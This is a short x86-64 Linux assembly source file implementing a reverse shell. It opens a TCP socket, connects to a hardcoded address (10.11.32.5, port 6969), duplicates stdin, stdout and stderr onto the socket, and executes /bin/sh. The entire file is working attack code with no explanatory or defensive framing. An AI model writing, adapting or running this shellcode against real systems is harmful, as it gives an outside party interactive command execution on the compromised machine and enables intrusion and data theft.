bits 64

global _start

section .bss
struc sockaddr_in
        sin_family      resw 1
        sin_port        resw 1
        sin_addr        resd 1
endstruc
sock_fd resd 1

section .rodata
sh_path db "/bin/sh", 0
init_struct:
        istruc sockaddr_in                      ;basic sockaddr_in implementation
                at sin_family,  dw 2
                at sin_port,    dw 0x391B
                at sin_addr,    dd 0x5020B0A
        iend

section .text
_start:
        mov rax, 41                             ;id for socket syscall
        mov rdi, 2                              ;set ip protocol to ipv4
        mov rsi, 1                              ;set type to SOCK_STREAM
        mov rdx, 6                              ;set protocol to IPPROTO_TCP
        syscall
        mov [sock_fd], rax                      ;saving socket fd

connect_socket:
        mov rax, 42                             ;id for connect syscall
        mov rdi, [sock_fd]
        mov rsi, init_struct
        mov rdx, 16                             ;set to 16 instead of 8 for compatibility purposes
        syscall

dup_stdin:
        mov rax, 33                             ;id for dup2 syscall
        mov rdi, [sock_fd]
        mov rsi, 0
        syscall

dup_stdout:
        mov rax, 33
        mov rdi, [sock_fd]
        mov rsi, 1
        syscall

dup_stderr:
        mov rax, 33
        mov rdi,  [sock_fd]
        mov rsi, 2
        syscall

init_shell:
        mov rax, 59                             ;id for execve syscall
        mov rdi, sh_path                        ;path to sh binary
        xor rsi, rsi                            ;set arg ant env param to NULL
        xor rdx, rdx
        syscall
